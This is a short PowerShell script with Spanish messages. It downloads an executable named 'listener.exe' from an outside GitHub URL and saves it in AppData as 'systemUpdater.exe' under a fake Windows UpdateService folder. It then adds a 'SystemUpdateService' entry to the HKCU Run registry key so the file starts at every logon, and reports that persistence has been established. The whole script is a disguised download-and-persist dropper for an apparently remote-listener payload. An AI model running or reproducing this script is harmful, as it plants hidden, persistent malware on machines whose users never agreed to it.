$targetDir = "$env:APPDATA\Microsoft\Windows\UpdateService"
$targetPath = "$targetDir\systemUpdater.exe"
$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"

try {
    if (!(Test-Path $targetDir)) {
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    }
}
catch {
    Write-Error "No se pudo crear el directorio: $_"
    exit 1
}

try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
    if (!(Test-Path $targetPath) || (Get-Item $targetPath).Length -eq 0) {
        throw "El archivo descñado está vacío o no se creó."
    }
    Write-Host "Descarga completada exitosamente."
}
catch {
    Write-Error "Error crítico al descargar el archivo: $_"
    if (Test-Path $targetPath) { Remove-Item $targetPath -Force }
    exit 1
}

$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdateService"

try {
    New-ItemProperty -Path "Registry::$regPath" -Name $regName -Value $targetPath -PropertyType String -Force
    Write-Host "Persistencia establecida correctamente."
}
catch {
    Write-Error "No se pudo crear la entrada en el registro: $_"
    exit 1
}

exit 0
